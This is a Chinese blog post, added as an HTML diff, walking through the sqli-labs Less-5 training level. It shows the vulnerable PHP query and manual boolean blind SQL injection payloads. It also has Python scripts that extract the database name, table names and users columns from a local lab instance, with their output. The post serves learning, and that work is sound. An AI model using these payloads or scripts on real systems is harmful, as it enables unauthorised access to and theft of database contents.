@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="sqli labs 中的第五关，有挺多姿势的 关键源码123456789101112131415161718&lt;?phpif(isset($_GET[&#39;id&#39;])) &amp;#123;    $id&#x3D;$_GET[&#39;id&#39;];    $sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对于 sqli-labs Less5 的思考">
+<meta property="og:url" content="http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/index.html">
+<meta property="og:site_name" content="Du1L0v3">
+<meta property="og:description" content="sqli labs 中的第五关，有挺多姿势的 关键源码123456789101112131415161718&lt;?phpif(isset($_GET[&#39;id&#39;])) &amp;#123;    $id&#x3D;$_GET[&#39;id&#39;];    $sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-04-08T06:11:49.000Z">
+<meta property="article:modified_time" content="2021-11-03T13:45:43.495Z">
+<meta property="article:author" content="Du1L0v3">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="sqli-labs">
+<meta property="article:tag" content="盲注">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>对于 sqli-labs Less5 的思考</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<!--
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+-->
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post " href="/2020/04/16/SUCTF-2019-EasyEeb/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2020/03/29/2020-MRCTF-WP/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&text=对于 sqli-labs Less5 的思考"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&title=对于 sqli-labs Less5 的思考"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&is_video=false&description=对于 sqli-labs Less5 的思考"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=对于 sqli-labs Less5 的思考&body=Check out this article: http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&title=对于 sqli-labs Less5 的思考"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&title=对于 sqli-labs Less5 的思考"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&title=对于 sqli-labs Less5 的思考"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&title=对于 sqli-labs Less5 的思考"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&name=对于 sqli-labs Less5 的思考&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&t=对于 sqli-labs Less5 的思考"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">关键源码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1"><span class="toc-number">2.1.</span> <span class="toc-text">1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2"><span class="toc-number">2.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3"><span class="toc-number">2.3.</span> <span class="toc-text">3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">3.2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4"><span class="toc-number">2.4.</span> <span class="toc-text">4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2"><span class="toc-number">2.4.1.</span> <span class="toc-text">4.2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">延时注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">双注入</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        对于 sqli-labs Less5 的思考
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Du1L0v3</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-08T06:11:49.000Z" itemprop="datePublished">2020-04-08</time>
+        
+        (Updated: <time datetime="2021-11-03T13:45:43.495Z" itemprop="dateModified">2021-11-03</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%99%BA%E6%85%A7%E7%9A%84%E6%94%B6%E8%97%8F/">智慧的收藏</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Web/" rel="tag">Web</a>, <a class="tag-link-link" href="/tags/sqli-labs/" rel="tag">sqli-labs</a>, <a class="tag-link-link" href="/tags/%E7%9B%B2%E6%B3%A8/" rel="tag">盲注</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>sqli labs 中的第五关，有挺多姿势的</p>
+<h1 id="关键源码"><a href="#关键源码" class="headerlink" title="关键源码"></a>关键源码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">    $sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br><span class="line">    $result&#x3D;mysql_query($sql);</span><br><span class="line">    $row &#x3D; mysql_fetch_array($result);</span><br><span class="line">	if($row) &#123;</span><br><span class="line">        echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;	</span><br><span class="line">        echo &#39;You are in...........&#39;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">  	&#125; else &#123;	</span><br><span class="line">        echo &#39;&lt;font size&#x3D;&quot;3&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;</span><br><span class="line">        print_r(mysql_error());</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&lt;&#x2F;font&gt;&quot;;	</span><br><span class="line">        echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D; 3&gt;&#39;;	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以知道是一道盲注题（也可以利用报错），因为我们输入正确的回显只有 <code>You are in...........</code> 的回显</p>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 判断注入类型 *&#x2F;</span><br><span class="line">?id&#x3D;1%27  &#x2F;&#x2F;-- 报错回显</span><br><span class="line">&#x2F;&#x2F; -- 单引号闭合</span><br><span class="line"></span><br><span class="line">&#x2F;* 获取列数 *&#x2F;</span><br><span class="line">?id&#x3D;1%27</span><br><span class="line">1: order by 3 --+  &#x2F;&#x2F;-- 正确回显</span><br><span class="line">2: order by 4 --+  &#x2F;&#x2F;-- 报错回显 </span><br><span class="line">&#x2F;&#x2F; -- 得到列数为 3</span><br><span class="line"></span><br><span class="line">&#x2F;* 获取版本 *&#x2F;</span><br><span class="line">?id&#x3D;1%27</span><br><span class="line">1: and left(version(),1) &#x3D; 5 --+  &#x2F;&#x2F;-- 正确回显</span><br><span class="line">&#x2F;&#x2F; -- 得到版本为 5.x</span><br><span class="line"></span><br><span class="line">&#x2F;* 判断数据库长度 *&#x2F;</span><br><span class="line">?id&#x3D;1%27</span><br><span class="line">1: and length(database()) &gt; 10 --+  &#x2F;&#x2F;-- 无回显，说明长度小于等于 10</span><br><span class="line">2: and length(database()) &gt; 5 --+  &#x2F;&#x2F;-- 正确回显，说明长度大于 5</span><br><span class="line">3: and length(database()) &gt; 7 --+  &#x2F;&#x2F;-- 正确回显，说明长度大于 7</span><br><span class="line">3: and length(database()) &gt; 8 --+  &#x2F;&#x2F;-- 无回显，说明长度小于等于 8  </span><br><span class="line">&#x2F;&#x2F; -- 得到数据库长度为 8</span><br><span class="line"></span><br><span class="line">&#x2F;* 判断数据库名称 *&#x2F;</span><br><span class="line">?id&#x3D;1%27</span><br><span class="line">1: and ascii(substr((select database()),1,1)) &gt; 114 --+  &#x2F;&#x2F;-- 正确回显，说明字符 ascii 码值大于 114</span><br><span class="line">2: &#x2F;&#x2F;-- ……略去过程 经过不懈尝试</span><br><span class="line">3: and ascii(substr((select database()),1,1)) &gt; 115 --+  &#x2F;&#x2F;-- 无回显，说明字符 ascii 码值小于等于 115</span><br><span class="line">&#x2F;&#x2F; -- 数据库名称第一位为 &#39;s&#39;</span><br><span class="line">&#x2F;* 每次都这样属实难顶，写脚本跑吧 *&#x2F;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @for: 跑数据库名称</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库名</span></span><br><span class="line">database_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line">url = <span class="string">&#x27;http://localhost/sqli-labs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;times&#125;,1)) &gt; &#123;num&#125; --+&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> times <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">        content = requests.get(url.<span class="built_in">format</span>(times=times, num=num)).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> content:</span><br><span class="line">            database_name += <span class="built_in">chr</span>(num)</span><br><span class="line">            <span class="built_in">print</span>(database_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(database_name)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 跑出来的结果</span></span><br><span class="line">s</span><br><span class="line">se</span><br><span class="line">sec</span><br><span class="line">secu</span><br><span class="line">secur</span><br><span class="line">securi</span><br><span class="line">securit</span><br><span class="line">security</span><br><span class="line">security</span><br><span class="line"><span class="comment"># 得到数据库名称 security</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="1-2"><a href="#1-2" class="headerlink" title="1.2"></a>1.2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 判断数据库名称，我们还有 left 这种方法嗷 *&#x2F;</span><br><span class="line">-- suck as:</span><br><span class="line">1: and left(database(),1) &gt; &#39;a&#39; --+</span><br><span class="line">2: and left(database(),2) &gt; &#39;a&#39; --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 判断所有表名长度，其间以逗号相连 *&#x2F;</span><br><span class="line">?id&#x3D;1%27</span><br><span class="line">1: and (select length(group_concat(table_name)) from information_schema.tables where table_schema&#x3D;&#39;security&#39;) &gt; 28 --+  &#x2F;&#x2F;-- 正确回显，说明总长度大于 28</span><br><span class="line">2: &#x2F;&#x2F;-- ……略去过程 经过不懈尝试</span><br><span class="line">3: and (select length(group_concat(table_name)) from information_schema.tables where table_schema&#x3D;&#39;security&#39;) &gt; 29 --+  &#x2F;&#x2F;-- 无回显，说明总长度小于等于 29</span><br><span class="line">&#x2F;&#x2F; -- 以逗号相连的所有表的总长度为 29</span><br><span class="line"></span><br><span class="line">&#x2F;* 判断所有表名 *&#x2F;</span><br><span class="line">?id&#x3D;1%27</span><br><span class="line">1: and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),1,1)) &gt; 100 --+  &#x2F;&#x2F;-- 正确回显，说明字符 ascii 码值大于 100</span><br><span class="line">2: &#x2F;&#x2F;-- ……略去过程 经过不懈尝试</span><br><span class="line">3: and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),1,1)) &gt; 101 --+  &#x2F;&#x2F;-- 无回显，说明字符 ascii 码值小于 101</span><br><span class="line">&#x2F;&#x2F; -- 数据库名称第一位为 &#39;e&#39;</span><br><span class="line">&#x2F;* 更加难顶，还是写脚本跑吧 *&#x2F;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @for: 跑数据所有表名称</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有表名</span></span><br><span class="line">all_table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line">url = <span class="string">&#x27;http://localhost/sqli-labs/Less-5/?id=1%27 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=%27security%27),&#123;times&#125;,1)) &gt; &#123;num&#125; --+&#x27;</span></span><br><span class="line"><span class="comment"># nums</span></span><br><span class="line">nums = [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>)]</span><br><span class="line">nums.insert(<span class="number">0</span>, <span class="built_in">ord</span>(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> times <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        content = requests.get(url.<span class="built_in">format</span>(times=times, num=num)).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> content:</span><br><span class="line">            all_table_name += <span class="built_in">chr</span>(num)</span><br><span class="line">            <span class="built_in">print</span>(all_table_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(all_table_name)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 跑出来的结果</span></span><br><span class="line">e</span><br><span class="line">em</span><br><span class="line">ema</span><br><span class="line">emai</span><br><span class="line">email</span><br><span class="line">emails</span><br><span class="line">emails,</span><br><span class="line">emails,r</span><br><span class="line">emails,re</span><br><span class="line">emails,ref</span><br><span class="line">emails,refe</span><br><span class="line">emails,refer</span><br><span class="line">emails,refere</span><br><span class="line">emails,referer</span><br><span class="line">emails,referers</span><br><span class="line">emails,referers,</span><br><span class="line">emails,referers,u</span><br><span class="line">emails,referers,ua</span><br><span class="line">emails,referers,uag</span><br><span class="line">emails,referers,uage</span><br><span class="line">emails,referers,uagen</span><br><span class="line">emails,referers,uagent</span><br><span class="line">emails,referers,uagents</span><br><span class="line">emails,referers,uagents,</span><br><span class="line">emails,referers,uagents,u</span><br><span class="line">emails,referers,uagents,us</span><br><span class="line">emails,referers,uagents,use</span><br><span class="line">emails,referers,uagents,user</span><br><span class="line">emails,referers,uagents,users</span><br><span class="line">emails,referers,uagents,users</span><br><span class="line"><span class="comment"># 得到所有表名称 emails,referers,uagents,users</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 判断列长度内容 *&#x2F;</span><br><span class="line">?id&#x3D;1%27</span><br><span class="line">1: and (select length(group_concat(column_name)) from information_schema.columns where table_name&#x3D;&#39;users&#39;) &gt; 62 --+  &#x2F;&#x2F;-- 正确回显，说明列长度大于 62</span><br><span class="line">2: &#x2F;&#x2F;-- ……略去过程 经过不懈尝试</span><br><span class="line">3: and (select length(group_concat(column_name)) from information_schema.columns where table_name&#x3D;&#39;users&#39;) &gt; 63 --+  &#x2F;&#x2F;-- 无回显，说明总长度小于等于 63</span><br><span class="line">&#x2F;&#x2F; -- 以逗号相连的所有列的总长度为 63</span><br><span class="line"></span><br><span class="line">&#x2F;* 然后可以用脚本跑跑 users 这个表玩玩 *&#x2F;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @for: 跑 users 表中列名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有表名</span></span><br><span class="line">all_column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line">url = <span class="string">&#x27;http://localhost/sqli-labs/Less-5/?id=1%27 and ascii(substr((select group_concat(column_name) from information_schema.columns%20where%20table_name=%27users%27),&#123;times&#125;,1)) &gt; &#123;num&#125; --+&#x27;</span></span><br><span class="line"><span class="comment"># nums</span></span><br><span class="line">nums = [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>)]</span><br><span class="line">nums.insert(<span class="number">0</span>, <span class="built_in">ord</span>(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> times <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">64</span>):</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        content = requests.get(url.<span class="built_in">format</span>(times=times, num=num)).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> content:</span><br><span class="line">            all_column_name += <span class="built_in">chr</span>(num)</span><br><span class="line">            <span class="built_in">print</span>(all_column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(all_column_name)</span><br></pre></td></tr></table></figure>
+
+<hr>
